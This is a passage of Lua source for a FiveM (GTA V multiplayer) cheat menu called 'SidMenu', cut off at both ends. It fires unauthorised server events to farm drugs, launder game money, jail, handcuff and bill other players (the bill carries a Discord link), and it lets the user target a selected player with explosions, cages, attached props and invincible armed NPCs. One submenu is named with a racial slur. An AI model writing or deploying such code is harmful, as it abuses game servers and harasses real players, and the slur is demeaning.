					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif SidMenu.Button("~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif SidMenu.Button("~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif SidMenu.Button("~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif SidMenu.Button("~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif SidMenu.Button("~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif SidMenu.Button("~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif SidMenu.Button("~g~Money Wash ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif SidMenu.Button("~r~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					drawNotification("~r~Everything is now stopped.")	
				end

				
			SidMenu.Display()
			elseif SidMenu.IsMenuOpened("NiggasOptions") then
				if SidMenu.Button("~g~Niggas cool") then
				end
				
				
-- online player menu
			elseif SidMenu.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and SidMenu.MenuButton("  ~w~"..GetPlayerName(i)..""..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~w~[~r~DEAD~w~]" or "~w~[~g~ALIVE~w~]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
		

				SidMenu.Display()
			elseif SidMenu.IsMenuOpened("PlayerOptionsMenu") then
				SidMenu.SetSubTitle("PlayerOptionsMenu", "Player ~w~[" .. GetPlayerName(SelectedPlayer) .. "]")
				if SidMenu.Button("~w~Spectate", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				elseif SidMenu.Button("~w~Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
				elseif SidMenu.MenuButton("~w~Weapon Menu", "SingleWepPlayer") then
				elseif SidMenu.Button("~w~Spawn Swat with ~r~AK47") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_assaultrifle"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif SidMenu.Button("~w~Spawn Prisoner with ~r~Knife") then
						local bQ = "s_m_y_prisoner_01"
						local bR = "weapon_switchblade"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
									CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetEntityInvincible(ped, true)
									SetPedCanSwitchWeapon(ped, true)
									TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end

				elseif SidMenu.Button("~w~Spawn Robber with ~r~Pistol") then
						local bQ = "s_m_y_robber_01"
						local bR = "weapon_pistol"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
									CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetEntityInvincible(ped, true)
									SetPedCanSwitchWeapon(ped, true)
									TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end

				elseif SidMenu.Button("~w~Spawn Niko with ~r~Knuckle") then
						local bQ = "mp_m_niko_01"
						local bR = "weapon_knuckle"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
									CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetEntityInvincible(ped, true)
									SetPedCanSwitchWeapon(ped, true)
									TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end
				
				elseif SidMenu.Button("~w~Spawn fat Man with ~r~Pistol50") then
						local bQ = "a_m_m_fatlatin_01"
						local bR = "weapon_pistol50"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
									CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetEntityInvincible(ped, true)
									SetPedCanSwitchWeapon(ped, true)
									TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end

				elseif SidMenu.Button("~w~Spawn Freemode ~r~Knife") then
						local bQ = "mp_f_freemode_01"
						local bR = "weapon_knife"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
									CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetEntityInvincible(ped, false)
									SetPedCanSwitchWeapon(ped, true)
									TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end

				elseif SidMenu.Button("~w~Spawn Women with ~r~Pistol") then
						local bQ = "mp_f_cocaine_01"
						local bR = "weapon_pistol"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
									CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetEntityInvincible(ped, false)
									SetPedCanSwitchWeapon(ped, false)
									TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end

				elseif SidMenu.Button("~w~Spawn Dog") then
						local bQ = "a_c_chop"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
									CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									SetEntityInvincible(ped, true)
									SetPedCanSwitchWeapon(ped, true)
									TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end

				elseif SidMenu.Button("~w~Open Inventory") then
				TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
				elseif SidMenu.Button("~g~Revive ~g~ESX") then
			        TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
				elseif SidMenu.Button("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) 
				elseif SidMenu.Button("~w~Give ~b~Armour ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) 
				elseif SidMenu.Button("~r~Kill ~w~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif SidMenu.Button('~r~Cage ~w~player') then
					  x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
					elseif SidMenu.Button("~r~Jail") then		
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(SelectedPlayer), 45 * 60, "keke do you love me?")
				elseif SidMenu.Button("~g~Unjail") then
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))	
				elseif SidMenu.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
					end
				elseif SidMenu.Button("~w~Spawn Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
                    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
                    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
                        RequestModel(cb)
                        while not HasModelLoaded(cb) do
                            Citizen.Wait(0)
                        end
                        local veh =
                            CreateVehicle(GetHashKey(cb), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true)
                    else
                        drawNotification('~w~Model is not valid!', true)
                    end
				elseif SidMenu.Button("~w~Cuff ~p~Mafia") then
					TriggerServerEvent('esx_mafia:handcuff', GetPlayerServerId(SelectedPlayer))
				elseif SidMenu.Button('~w~Drag ~p~Mafia') then
					TriggerServerEvent('esx_mafia:drag', GetPlayerServerId(SelectedPlayer))
				elseif SidMenu.Button("~w~Cuff ~g~Grove") then
					TriggerServerEvent('esx_grove:handcuff', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent('esx_Westside-Nation:handcuff', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent('esx_Camorra:handcuff', GetPlayerServerId(SelectedPlayer))
				elseif SidMenu.Button('~w~Drag ~g~Grove') then
					TriggerServerEvent('esx_grove:drag', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent('esx_Westside-Nation:drag', GetPlayerServerId(SelectedPlayer))
				elseif SidMenu.Button("~w~Cuff ~b~Police") then
					TriggerServerEvent("esx_policejob:handcuff", GetPlayerPed(SelectedPlayer))
				elseif SidMenu.Button('~w~Drag ~b~Police') then
					TriggerServerEvent('esx_policejob:drag', GetPlayerServerId(SelectedPlayer))
				elseif SidMenu.Button('~w~put in vehicle') then
					TriggerServerEvent('esx_policejob:putInVehicle', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent('esx_Westside-Nation:putInVehicle', GetPlayerServerId(SelectedPlayer))
				elseif SidMenu.Button('~w~out of vehicle') then
					TriggerServerEvent('esx_policejob:OutVehicle', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent('esx_Westside-Nation:OutVehicle', GetPlayerServerId(SelectedPlayer))
				elseif SidMenu.Button('~w~confiscate') then	
					TriggerServerEvent('esx_mafia:confiscatePlayerItem', GetPlayerServerId(SelectedPlayer), itemType, itemName, amount)
				elseif SidMenu.Button('~w~~b~Send Bill') then
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(SelectedPlayer), 'society_police', 'https://discord.gg/u9CxU33 Bombay', 6969696969)
				elseif SidMenu.Button("~w~Kick Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))	
				elseif SidMenu.Button("~r~Tunnel ~w~Player") then -- Tunnel Player
						local eb = "xs_prop_chips_tube_wl"
						local ec = GetHashKey(eb)
						local ed = CreateObject(ec, 0, 0, 0, true, true, true)
						AttachEntityToEntity(ed, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			    elseif SidMenu.Button("~r~Bottle ~w~Player") then -- Bottle Player
						local eb = "xs_prop_plastic_bottle_wl"
						local ec = GetHashKey(eb)
						local ed = CreateObject(ec, 0, 0, 0, true, true, true)
						AttachEntityToEntity(ed, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				elseif SidMenu.Button("~r~Ufo ~w~Player") then -- Ufo Player
						local eb = "p_spinning_anus_s"
						local ec = GetHashKey(eb)
						local ed = CreateObject(ec, 0, 0, 0, true, true, true)
						AttachEntityToEntity(ed, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				elseif SidMenu.Button("~r~Windmill ~w~Player") then -- Windmill Player
						local eb = "prop_windmill_01"
						local ec = GetHashKey(eb)
						local ed = CreateObject(ec, 0, 0, 0, true, true, true)
						AttachEntityToEntity(ed, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				elseif SidMenu.Button("~r~Weed ~w~Player") then -- Weed Player
						local eb = "prop_weed_01"
						local ec = GetHashKey(eb)
						local ed = CreateObject(ec, 0, 0, 0, true, true, true)
						AttachEntityToEntity(ed, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				elseif SidMenu.Button('~w~Clone Car') then
                    ClonePedVeh()
				elseif SidMenu.Button("~w~Spawn Swat with ~r~AK47") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif SidMenu.Button('~w~Spawn Following Asshat') then
                    asshat = true
                    local target = GetPlayerPed(SelectedPlayer)
                    local assped = nil
                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
                    local veh = vehlist[math.random(#vehlist)]
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('s_m_y_hwaycop_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
                        RequestModel('s_m_y_hwaycop_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        v1 =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        SetVehicleGravityAmount(v, 15.0)
                        SetVehicleGravityAmount(v1, 15.0)
                        SetEntityInvincible(v, true)
                        SetEntityInvincible(v1, true)
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('s_m_y_hwaycop_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_hwaycop_01') then
                                Citizen.Wait(50)
                                local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                assped = ped
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v1, -1)
                                    SetPedIntoVehicle(pas, v, 0)
                                    SetPedIntoVehicle(pas1, v1, 0)
                                    TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    asstarget = target
                                    TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    SetDriverAbility(ped, 10.0)
                                    SetDriverAggressiveness(ped, 10.0)
                                    SetDriverAbility(ped1, 10.0)
                                    SetDriverAggressiveness(ped1, 10.0)
                                end
                            end
                        end
                end
				elseif SidMenu.Button('~w~Spawn Driveby') then
                    local veh = SultanRS
                    for i = 0, 1 do
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('s_m_y_swat_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_y_swat_01') do
                        RequestModel('s_m_y_swat_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        SetEntityInvincible(v, true)
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
